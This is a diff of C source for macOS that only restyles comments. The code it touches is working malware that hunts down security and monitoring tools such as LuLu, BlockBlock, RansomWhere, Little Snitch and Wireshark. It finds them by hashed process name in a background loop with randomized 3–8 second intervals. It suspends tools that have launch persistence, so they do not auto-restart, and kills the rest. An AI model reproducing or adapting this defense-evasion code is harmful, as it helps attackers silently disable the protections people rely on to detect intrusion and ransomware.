@@ -10,7 +10,7 @@
 #include <ctype.h>
 #include <time.h>
 
-// DJB2 hash for process name matching
+/* DJB2 hash for process name matching */
 static uint32_t hash_str(const char *str) {
     uint32_t hash = 5381;
     int c;
@@ -21,23 +21,21 @@ static uint32_t hash_str(const char *str) {
     return hash;
 }
 
-// Hashes of tools to terminate
 static const uint32_t target_hashes[] = {
-    0x7c9a4887,  // lulu
-    0xcb6c1360,  // oversight
-    0x2a4852f1,  // knockknock
-    0x1c4c617b,  // blockblock
-    0x192a2fce,  // reikey
-    0x6d257830,  // ransomwhere
-    0xe83493e9,  // taskexplorer
-    0x6e4495bc,  // littlesnitch
-    0x3a592cf5,  // wireshark
-    0x97ddb30d,  // netiquette
-    0xfc503acc,  // processmonitor
+    0x7c9a4887,  /* lulu */
+    0xcb6c1360,  /* oversight */
+    0x2a4852f1,  /* knockknock */
+    0x1c4c617b,  /* blockblock */
+    0x192a2fce,  /* reikey */
+    0x6d257830,  /* ransomwhere */
+    0xe83493e9,  /* taskexplorer */
+    0x6e4495bc,  /* littlesnitch */
+    0x3a592cf5,  /* wireshark */
+    0x97ddb30d,  /* netiquette */
+    0xfc503acc,  /* processmonitor */
     0
 };
 
-// Check if process has LaunchDaemon/Agent 
 static int has_persistence(const char *name) {
     char buf[PATH_MAX];
     struct stat st;
@@ -54,7 +52,7 @@ static int has_persistence(const char *name) {
     return 0;
 }
 
-// Extract process name from full path and normalize (lowercase, strip .app)
+/* Extract process name from path, normalize (lowercase, strip .app) */
 static void extract_name(const char *path, char *out, size_t out_size) {
     const char *slash = strrchr(path, '/');
     const char *name = slash ? slash + 1 : path;
@@ -69,7 +67,6 @@ static void extract_name(const char *path, char *out, size_t out_size) {
     if (dot) *dot = '\0';
 }
 
-// Is this hash in our target list?
 static int is_target(uint32_t hash) {
     for (int i = 0; target_hashes[i]; i++) {
         if (hash == target_hashes[i]) return 1;
@@ -77,10 +74,7 @@ static int is_target(uint32_t hash) {
     return 0;
 }
 
-/**
- * If process has LaunchDaemon/Agent, just suspend it (SIGSTOP).
- * Killing would trigger auto-restart. Otherwise escalate TERM > KILL.
- */
+/* SIGSTOP if persistent (avoid auto-restart), else TERM > KILL */
 static void terminate_proc(pid_t pid, const char *name) {
     if (has_persistence(name)) {
         kill(pid, SIGSTOP);
@@ -93,10 +87,7 @@ static void terminate_proc(pid_t pid, const char *name) {
     }
 }
 
-/**
- * Queries kernel for all running PIDs, gets their paths, extracts names,
- * hashes them, and terminates matches. No fs checks.
- */
+/* Hunt and terminate security tools by hash */
 void hunt_procs(void) {
     int bytes = proc_listpids(PROC_ALL_PIDS, 0, NULL, 0);
     if (bytes <= 0) return;
@@ -126,14 +117,13 @@ void hunt_procs(void) {
     free(pids);
 }
 
-// Background monitoring loop with randomized timing
+/* Background monitoring with randomized timing */
 static void *monitor(void *arg) {
     (void)arg;
-    
     srand(getpid() ^ time(NULL));
     
     while (1) {
-        sleep(3 + (rand() % 6));  // 3-8 seconds
+        sleep(3 + (rand() % 6)); /* 3-8 sec */
         hunt_procs();
     }
     
